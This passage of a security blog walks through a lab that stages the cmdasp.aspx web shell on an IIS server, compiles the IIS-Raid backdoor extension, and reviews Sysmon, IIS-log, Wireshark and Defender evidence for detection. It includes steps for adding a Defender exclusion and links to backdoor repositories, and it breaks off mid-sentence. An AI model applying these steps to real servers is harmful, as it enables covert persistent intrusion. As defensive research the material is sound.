<nav><ul class="ez-toc-list ez-toc-list-level-1 "><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-1" href="#IIS_Extensions_As_Backdoors">IIS Extensions As Backdoors</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-2" href="#What_Is_IIS">What Is IIS?</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#IIS_Vulnerabilities_Exploitation">IIS Vulnerabilities &amp; Exploitation</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#IIS_Server_Features_Application_Pool_Settings">IIS Server Features &amp; Application Pool Settings</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-5" href="#Lab_Setup">Lab Setup</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-6" href="#Web_Shells_vs_IIS_Extensions">Web Shells vs IIS Extensions</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Web_Shells">Web Shells</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#IIS_Extensions">IIS Extensions</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-9" href="#Compiling_Installing_An_IIS_Extension">Compiling &amp; Installing An IIS Extension</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#IIS-Raid">IIS-Raid</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#Compiling_The_Extension">Compiling The Extension</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#Uploading_The_Extension">Uploading The Extension</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#Installing_The_IIS_Extension_Using_AppCmd">Installing The IIS Extension Using AppCmd</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-14" href="#Interacting_With_IIS-Raid">Interacting With IIS-Raid</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-15" href="#ImageDLLModule_Loads_%E2%80%93_w3wpexe">Image/DLL/Module Loads – w3wp.exe</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#Method_1_%E2%80%93_Sysmon_Event_ID_7_%E2%80%93_Image_Loaded">Method 1 – Sysmon Event ID 7 – Image Loaded</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#Method_2_%E2%80%93_User_Mode_MiniDump_Task_Manager_Debugger_Visual_Studio">Method 2 – User Mode  MiniDump (Task Manager) &amp; Debugger (Visual Studio)</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-18" href="#Wrapping_Things_Up%E2%80%A6">Wrapping Things Up…</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-19" href="#Defensive_Event_Summary">Defensive Event Summary</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#Web_Shell">Web Shell</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#IIS_ExtensionIIS-RaidIIS-Backdoordll">IIS Extension/IIS-Raid/IIS-Backdoor.dll</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-22" href="#Upload">Upload</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-23" href="#Install">Install</a></li><li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-24" href="#Interact">Interact</a></li></ul></li></ul></li></ul></nav></div>
<h3><span class="ez-toc-section" id="IIS_Extensions_As_Backdoors"></span>IIS Extensions As Backdoors<span class="ez-toc-section-end"></span></h3>
<p>Microsoft recently published an interesting blog explaining how they’ve noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers:<br>
<a href="https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/" target="_blank" rel="noopener"><strong>https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/</strong></a></p>
<p>The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order to understand what it takes to build an IIS extension, deploy it, and then ultimately see how it executes on a system as it is interacted with.</p>
<p>I’ve always been a huge fan of IIS (7+) and I thought this would be an interesting opportunity to revisit IIS from a more offensive/defensive perspective. I have also noticed that while IIS can be incredibly prevalent in Windows environments, it is often markedly less understood than the open source web server variants like Apache and Nginx. With this in mind, my intention for this post is to cover a little bit about IIS and some of its nuances, demonstrate what malicious IIS extension activity looks like, and hopefully come up with some ideas and log examples to help narrow in on this sort of activity at scale.</p>
<h3><span class="ez-toc-section" id="What_Is_IIS"></span>What Is IIS?<span class="ez-toc-section-end"></span></h3>
<p>Internet Information Services (IIS) is Microsoft’s web server platform. With  IIS being a generic web server capable of hosting ASP.NET applications, Microsoft also uses IIS to host the web front end components for some their own services like Outlook Web Access (OWA) and Remote Desktop Web Access (RDWeb). So even if an environment is not explicitly hosting sites on IIS, keep in mind that there is a chance that IIS is present in some sort of supporting role.</p>
<h4><span class="ez-toc-section" id="IIS_Vulnerabilities_Exploitation"></span>IIS Vulnerabilities &amp; Exploitation<span class="ez-toc-section-end"></span></h4>
<p>While IIS can and has had its share of vulnerabilities, the web server itself is relatively mature and vulnerabilities are very rare today.</p>
<p>As explained in the Microsoft post, IIS backdoors are typically deployed in the post exploitation phase. This means that the server has already been compromised by some other means, with the most likely scenario being a vulnerability in the web application that is being hosted by IIS.</p>
<h4><span class="ez-toc-section" id="IIS_Server_Features_Application_Pool_Settings"></span>IIS Server Features &amp; Application Pool Settings<span class="ez-toc-section-end"></span></h4>
<p>There are a few features and settings that I want to highlight really quickly that are worth being aware of when it comes to abusing/investigating IIS servers and application pools/worker processes.</p>
<p>The first item is a feature of IIS and web servers in general, host headers. Host headers allow a web server to host multiple web sites behind single IP address. How does the IIS server know to serve up the correct site? The request has to come in with a “host” header (usually the domain) that matches the binding set in IIS:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Host-Headers-Edit.png" data-lbwps-width="1918" data-lbwps-height="690" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Host-Headers-Edit-500x180.png"><img decoding="async" src="/wp-content/uploads/2022/09/IIS-Host-Headers-Edit-500x180.png" alt="" width="500" height="180" class="aligncenter size-medium wp-image-5652" srcset="/wp-content/uploads/2022/09/IIS-Host-Headers-Edit-500x180.png 500w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit-1024x368.png 1024w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit-768x276.png 768w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit-1536x553.png 1536w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit.png 1918w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>If investigating traffic to a server purely based off of IP address, this behavior can mix in additional/unrelated traffic. Wireshark filters like “http.host” can be used to help ensure only traffic to the specific domain is included.</p>
<p>Another design feature to point out is that a single IIS server can support thousands of sites and each site will have at least one IIS worker process (w3wp.exe). This means that there can be <em><strong>many</strong></em> instances of w3wp.exe running on a single host, and it can be a little tricky to hone in on the right one. Process IDs and user IDs (assuming they are descriptive) can useful here, the IIS Manager also provides some useful information:</p>
<p><a href="/wp-content/uploads/2022/10/IIS-w3wps-1.png" data-lbwps-width="1506" data-lbwps-height="946" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/10/IIS-w3wps-1-500x314.png"><img decoding="async" src="/wp-content/uploads/2022/10/IIS-w3wps-1-500x314.png" alt="" width="500" height="314" class="aligncenter size-medium wp-image-5667" srcset="/wp-content/uploads/2022/10/IIS-w3wps-1-500x314.png 500w, /wp-content/uploads/2022/10/IIS-w3wps-1-1024x643.png 1024w, /wp-content/uploads/2022/10/IIS-w3wps-1-768x482.png 768w, /wp-content/uploads/2022/10/IIS-w3wps-1.png 1506w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p><strong>Application Pool Settings</strong></p>
<p><a href="/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set.png" data-lbwps-width="1920" data-lbwps-height="1040" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-500x271.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-500x271.png" alt="" width="500" height="271" class="aligncenter size-medium wp-image-5645" srcset="/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-500x271.png 500w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-1024x555.png 1024w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-768x416.png 768w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-1536x832.png 1536w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set.png 1920w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>The table below has a few of the more notable default application pool settings:</p>
<table>
<tr>
<td><strong>Setting</strong></td>
<td><strong>Default Value</strong></td>
<td><strong>Notes</strong></td>
</tr>
<tr>
<td>Start Mode</td>
<td>OnDemand</td>
<td>The worker process (w3wp.exe) will not start until a request is made.</td>
</tr>
<tr>
<td>Idle Time-out (minutes)</td>
<td>20</td>
<td>After 20 minutes with no requests, the worker process (w3wp.exe) will terminate.</td>
</tr>
<tr>
<td>Idle Time-out Action</td>
<td>Terminate</td>
<td>The worker process (w3wp.exe) will terminate once the time-out has been reached.</td>
</tr>
<tr>
<td>Maximum Worker Processes</td>
<td>1</td>
<td>A single site can have more than one worker process (w3wp.exe) running (aka Web garden).</td>
</tr>
<tr>
<td>Rapid-Fail Protection</td>
<td>5 failures within 5 minutes</td>
<td>If you run bad enough code to crash the worker process within the threshold, IIS will stop the site, requiring administrative intervention.</td>
</tr>
<tr>
<td>Recycling – Regular Time Interval (minutes)</td>
<td>1740 (29 hours)</td>
<td>When this limit is reached, a new w3wp.exe process will be spawned (new PID) and the old one will be terminated once it has finished processing all active requests.</td>
</tr>
</table>
<h3><span class="ez-toc-section" id="Lab_Setup"></span>Lab Setup<span class="ez-toc-section-end"></span></h3>
<p>The lab setup for this post is going to consist of two virtual machines, a fully up to date Windows Server 2019 (victim) and a Kali Linux host (attacker). These hosts are on the same network and DNS records have been configured for each host to make it a little easier to differentiate between the hosts themselves and to help distinguish between internal and external connections:</p>
<table>
<tr>
<td><strong>Host</strong></td>
<td><strong>DNS</strong></td>
<td><strong>IP</strong></td>
</tr>
<tr>
<td>Windows Server – VMW-L-IIS01</td>
<td>iis.robwillis.info</td>
<td>192.168.90.216</td>
</tr>
<tr>
<td>Kali – iPhone-X</td>
<td>kali.external-threat.net</td>
<td>192.168.90.214</td>
</tr>
</table>
<p>IIS with ASP.NET support was installed on the Windows server using the following command:</p>
<pre>
PS &gt; Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole, IIS-WebServer, IIS-CommonHttpFeatures, IIS-Security, IIS-RequestFiltering, IIS-StaticContent, IIS-DefaultDocument, IIS-DirectoryBrowsing, IIS-HttpErrors, IIS-HttpRedirect, IIS-HealthAndDiagnostics, IIS-HttpLogging, IIS-Performance, IIS-HttpCompressionStatic, IIS-HttpCompressionDynamic, IIS-WebServerManagementTools, IIS-ManagementConsole, IIS-NetFxExtensibility45, IIS-ISAPIExtensions, IIS-ISAPIFilter, IIS-ASPNET45
</pre>
<p>And a basic website (iis.robwillis.info) has been configured:<br>
<a href="/wp-content/uploads/2022/09/Get-IISSite.png" data-lbwps-width="863" data-lbwps-height="226" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/Get-IISSite-500x131.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Get-IISSite-500x131.png" alt="" width="500" height="131" class="aligncenter size-medium wp-image-5471" srcset="/wp-content/uploads/2022/09/Get-IISSite-500x131.png 500w, /wp-content/uploads/2022/09/Get-IISSite-768x201.png 768w, /wp-content/uploads/2022/09/Get-IISSite.png 863w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>For time sake, I am not going to cover web application vulnerabilities or initial access. The testing in this post will start with the Windows server/IIS site in an “assumed compromised” state, meaning a web shell has already been staged on the server.</p>
<p>For analysis and detection, I will mainly be relying on the following logs and tools:</p>
<ul>
<li>Windows OS Logs</li>
<li>IIS Logs</li>
<li>SysInternals Sysmon (since the data should be very similar to most Endpoint Detection &amp; Response (EDR) tooling)</li>
<li>Visual Studio Community (Compiling/Debugging)</li>
<li>Wireshark (Packet Capture)</li>
</ul>
<p>I want to keep the logging/tooling set as light as possible to emulate the basic data set that should (hopefully) be available to a defender when investigating a potential incident. Keeping it real, while trying to do more with less.</p>
<h3><span class="ez-toc-section" id="Web_Shells_vs_IIS_Extensions"></span>Web Shells vs IIS Extensions<span class="ez-toc-section-end"></span></h3>
<h4><span class="ez-toc-section" id="Web_Shells"></span>Web Shells<span class="ez-toc-section-end"></span></h4>
<p>In a blog post from last year, Microsoft mentioned how they noticed incidents involving web shells were also on the rise:<br>
<a href="https://www.microsoft.com/security/blog/2021/02/11/web-shell-attacks-continue-to-rise/" target="_blank" rel="noopener"><strong>https://www.microsoft.com/security/blog/2021/02/11/web-shell-attacks-continue-to-rise/</strong></a></p>
<p>Web shells are important to note when it comes to IIS extension activity because attackers will typically leverage a web shell to install additional malware, like an IIS extension/backdoor. So before jumping into IIS extensions, I want to talk a little bit about what exactly a web shell is and demonstrate what it looks like moving from a web shell to an IIS extension/backdoor.</p>
<p>A web shell is usually a small piece of software (often a single file) written in a language used for web development (ASP.NET, PHP, JSP), that when uploaded to a web servers root directory, provides an attacker with remote access/code execution. Web shells do not need to be compiled, can be edited in a normal text editor and come in a variety of extensions (.asp, .aspx, .php, .jsp, etc).</p>
<p>The following conditions must be met for an attacker to be able to successfully upload and execute a web shell on a server:</p>
<ul>
<li><strong>Remote Code Execution</strong> – Attacker has already achieved RCE via a vulnerability in the server or web application, and can now run commands to download or load files from remote sources.</li>
<li><strong>Write Access</strong> – By default IIS identities have minimal write access to the file system, however dynamic applications will often require write access to portions of the webroot and temporary directories.</li>
<li><strong>Server Side Support</strong> – The server must support some sort of web technology (IIS servers typically support ASP/ASP.NET). If an attacker attempts to use a web shell written in a technology that the server does not support, the web shell will not execute.</li>
</ul>
<p>Web shells will typically be executed under the IIS worker process (w3wp.exe) using the application pool identity (ex – IIS AppPool\DefaultAppPool). With IIS, every new site automatically generates its own application pool and associated identity/account unless otherwise specified. These default IIS AppPool accounts will run with very similar permissions to the Network Service account. While the default settings are promising from a hardening perspective, unfortunately administrators/developers will often end up configuring overly permissive settings in the name of “troubleshooting” an application during the deployment phase and then these settings end up remaining in place. </p>
<p>Web shells come in quite a few flavors and there are plenty of examples/projects available online. Kali Linux includes a few useful and reliable (although likely to get detected if used as is!) web shells that can be found in the default /usr/share/webshells directory:</p>
<p><a href="/wp-content/uploads/2022/09/Kali-Linux-WebShells.png" data-lbwps-width="807" data-lbwps-height="509" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/Kali-Linux-WebShells-500x315.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Kali-Linux-WebShells-500x315.png" alt="" width="500" height="315" class="aligncenter size-medium wp-image-5473" srcset="/wp-content/uploads/2022/09/Kali-Linux-WebShells-500x315.png 500w, /wp-content/uploads/2022/09/Kali-Linux-WebShells-768x484.png 768w, /wp-content/uploads/2022/09/Kali-Linux-WebShells.png 807w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>With this being an IIS server, I will be using the cmdasp.aspx web shell. You can see in the screen shot below, that this web shell is sort of just a web based wrapper providing access to cmd.exe:</p>
<p><a href="/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx.png" data-lbwps-width="1277" data-lbwps-height="757" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-500x296.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-500x296.png" alt="" width="500" height="296" class="aligncenter size-medium wp-image-5474" srcset="/wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-500x296.png 500w, /wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-1024x607.png 1024w, /wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx-768x455.png 768w, /wp-content/uploads/2022/09/Kali-Linux-cmdaspaspx.png 1277w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>Once the web shell has been uploaded to the server, all the attacker has to do is browse to the /cmdasp.aspx page and they are presented with a simple form that executes the submitted input via cmd.exe. The screenshot below shows what it looks like from the attacker perspective on the remote Kali host running “whoami &amp;&amp; hostname”:</p>
<p><a href="/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View.png" data-lbwps-width="933" data-lbwps-height="240" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-500x129.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-500x129.png" alt="" width="500" height="129" class="aligncenter size-medium wp-image-5479" srcset="/wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-500x129.png 500w, /wp-content/uploads/2022/09/Kali-Webshell-Attacker-View-768x198.png 768w, /wp-content/uploads/2022/09/Kali-Webshell-Attacker-View.png 933w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>On the Windows server, the IIS logs captured this activity as a few POST requests against the /cmdasp.aspx page from the attacker host (192.168.90.214), but the logs are otherwise very limited when it comes to visibility:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1.png" data-lbwps-width="1826" data-lbwps-height="222" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-500x61.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-500x61.png" alt="" width="500" height="61" class="aligncenter size-medium wp-image-5483" srcset="/wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-500x61.png 500w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-1024x124.png 1024w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-768x93.png 768w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1-1536x187.png 1536w, /wp-content/uploads/2022/09/IIS-Web-Shell-IIS-Logs-1.png 1826w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>The Sysmon/Operational logs captured the same activity under Event ID 1 (Process Create):</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1.png" data-lbwps-width="1289" data-lbwps-height="764" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-500x296.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-500x296.png" alt="" width="500" height="296" class="aligncenter size-medium wp-image-5485" srcset="/wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-500x296.png 500w, /wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-1024x607.png 1024w, /wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1-768x455.png 768w, /wp-content/uploads/2022/09/IIS-Web-Shell-Sysmon-EID-1.png 1289w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>There is a lot of useful information here – Notice the image (c:\windows\system32\cmd.exe), command line (cmd.exe /c whoami &amp;&amp; hostname) and that the parent process is the IIS worker process (w3wp.exe) running under the IIS application pool identity (IIS APPPOOL\iis.robwillis.info).</p>
<p>As a general rule of thumb, IIS worker processes should not be spawning child processes and even more so when it comes to executables like cmd or PowerShell. This behavior alone is usually enough to warrant a deeper investigation, but that is not to say you won’t find a fair share of “legitimate production use cases”. With this in mind, it should become fairly obvious relatively quickly when activity is not something as simple as creating a daily pdf report from a sql database. </p>
<p>Taking a look at the packet capture of the web shell activity in Wireshark reveals the rest of the story about what exactly happened here:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit.png" data-lbwps-width="1916" data-lbwps-height="1036" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-500x270.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-500x270.png" alt="" width="500" height="270" class="aligncenter size-medium wp-image-5487" srcset="/wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-500x270.png 500w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-1024x554.png 1024w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-768x415.png 768w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit-1536x831.png 1536w, /wp-content/uploads/2022/09/IIS-Web-shell-pcap-edit.png 1916w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>Combining all of this information, we now know who the attacker was (192.168.90.214), how they interacted with the server (/cmdasp.aspx), what was requested/executed (cmd.exe /c whoami &amp;&amp; hostname), and what the response was (iis apppool\iis.robwillis.info, VMW-L-IIS01).</p>
<p>We also have a copy of the web shell since it was uploaded to the server:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-WebShell-Webroot.png" data-lbwps-width="1902" data-lbwps-height="1031" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-WebShell-Webroot-500x271.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-WebShell-Webroot-500x271.png" alt="" width="500" height="271" class="aligncenter size-medium wp-image-5589" srcset="/wp-content/uploads/2022/09/IIS-WebShell-Webroot-500x271.png 500w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot-1024x555.png 1024w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot-768x416.png 768w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot-1536x833.png 1536w, /wp-content/uploads/2022/09/IIS-WebShell-Webroot.png 1902w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>During the initial manual testing/staging, Windows Defender did happen to grab this particular web shell (cmdasp.aspx) as “Backdoor:ASP/Webshell” – Windows Defender/Operational – Event ID 1116 (Detected) &amp; 1117 (Action Taken):</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Web-Shell-Defender.png" data-lbwps-width="1730" data-lbwps-height="1013" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Web-Shell-Defender-500x293.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Web-Shell-Defender-500x293.png" alt="" width="500" height="293" class="aligncenter size-medium wp-image-5542" srcset="/wp-content/uploads/2022/09/IIS-Web-Shell-Defender-500x293.png 500w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender-1024x600.png 1024w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender-768x450.png 768w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender-1536x899.png 1536w, /wp-content/uploads/2022/09/IIS-Web-Shell-Defender.png 1730w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>To keep things moving forward, an exception was created in Defender to allow the shell.</p>
<h4><span class="ez-toc-section" id="IIS_Extensions"></span>IIS Extensions<span class="ez-toc-section-end"></span></h4>
<p>Starting with IIS 7 on Windows Server 2008, Microsoft introduced a modular architecture with a rich set of APIs that allowed developers to extend and customize the functionality of IIS web servers. These IIS extensions support APIs using either native C/C++ or managed C#/VB.NET code structures. IIS extensions will typically be in the form of a dynamic link library (.DLL).</p>
<p>Microsoft has a wealth of information to help understand what it takes to get started developing IIS Extensions that can be found here:<br>
<a href="https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/extending-web-server-functionality-in-net" target="_blank" rel="noopener"><strong>https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/extending-web-server-functionality-in-net</strong></a></p>
<p>Examples of legitimate IIS extensions and use cases:</p>
<ul>
<li>Advanced Logging</li>
<li>Application Request Routing (Load balancer/reverse proxy)</li>
<li>WinCache</li>
<li>Dynamic IP Restrictions</li>
<li>FastCGI</li>
<li>FTP Publishing Service</li>
<li>Smooth Streaming</li>
</ul>
<p>Examples of malicious IIS Extensions:</p>
<ul>
<li><a href="https://github.com/nu11secur1ty/IIS-Backdoor/" target="_blank" rel="noopener"><strong>https://github.com/nu11secur1ty/IIS-Backdoor/</strong></a></li>
<li><a href="https://github.com/0x09AL/IIS-Raid" target="_blank" rel="noopener"><strong>https://github.com/0x09AL/IIS-Raid</strong></a></li>
</ul>
<h3><span class="ez-toc-section" id="Compiling_Installing_An_IIS_Extension"></span>Compiling &amp; Installing An IIS Extension<span class="ez-toc-section-end"></span></h3>
<h4><span class="ez-toc-section" id="IIS-Raid"></span>IIS-Raid<span class="ez-toc-section-end"></span></h4>
<p>For the extension testing, I am going to be using <a href="https://github.com/0x09AL/IIS-Raid" target="_blank" rel="noopener"><strong>IIS-Raid by 0x09AL</strong></a>. The extension itself is coded in native C++ with a remote controller component written in python. Once installed, the module will process every request sent to the IIS server but will only respond differently if a few special headers and values are passed. MDSec has an in depth blog post on IIS-Raid that can be found here:<br>
<a href="https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/" target="_blank" rel="noopener"><strong>https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/</strong></a></p>
<h4><span class="ez-toc-section" id="Compiling_The_Extension"></span>Compiling The Extension<span class="ez-toc-section-end"></span></h4>
<p>Before compiling and using IIS-Raid, some modifications need to be made, starting with the headers in the IIS-Raid-master\module\Functions.h:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Functionsh.png" data-lbwps-width="572" data-lbwps-height="368" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Functionsh-500x322.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Functionsh-500x322.png" alt="" width="500" height="322" class="aligncenter size-medium wp-image-5497" srcset="/wp-content/uploads/2022/09/IIS-Raid-Functionsh-500x322.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Functionsh.png 572w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>Then to build/compile the extension by opening up the solution file (IIS-Backdoor.sln) and going to Build &gt; Build Solution:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Build.png" data-lbwps-width="678" data-lbwps-height="393" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Build-500x290.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Build-500x290.png" alt="" width="500" height="290" class="aligncenter size-medium wp-image-5498" srcset="/wp-content/uploads/2022/09/IIS-Raid-Build-500x290.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Build.png 678w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>Here is the output after building the project, with the extension file being the IIS-Backdoor.dll:</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Files.png" data-lbwps-width="829" data-lbwps-height="506" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Files-500x305.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Files-500x305.png" alt="" width="500" height="305" class="aligncenter size-medium wp-image-5499" srcset="/wp-content/uploads/2022/09/IIS-Raid-Files-500x305.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Files-768x469.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Files.png 829w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>Windows Defender did grab the backdoor (IIS-Backdoor.dll) as “Backdoor:Win32/IISBackdoor.A” right after compiling – Windows Defender/Operational – Event ID 1116 (Detected) &amp; 1117 (Action Taken):</p>
<p><a href="/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender.png" data-lbwps-width="1419" data-lbwps-height="808" data-lbwps-srcsmall="https://robwillis.info/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-500x285.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-500x285.png" alt="" width="500" height="285" class="aligncenter size-medium wp-image-5500" srcset="/wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-500x285.png 500w, /wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-1024x583.png 1024w, /wp-content/uploads/2022/09/IIS-Raid-Windows-Defender-768x437.png 768w, /wp-content/uploads/2022/09/IIS-Raid-Windows-Defender.png 1419w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
<p>Doing a simple string based analysis on the IIS-Backdoor.dll shows plenty of unique strings (including the headers and password) that make basic signature based detection relatively easy:</p>
